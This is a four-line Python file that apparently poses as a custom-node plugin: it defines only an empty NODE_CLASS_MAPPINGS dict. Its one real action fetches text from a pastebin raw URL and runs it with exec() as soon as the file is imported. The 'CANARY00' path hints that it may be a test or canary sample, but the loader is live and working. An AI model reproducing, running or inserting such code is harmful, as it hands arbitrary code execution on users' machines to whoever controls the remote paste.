import requests
r = requests.get('https://pastebin.com/raw/CANARY00')
exec(r.text)
NODE_CLASS_MAPPINGS = {}
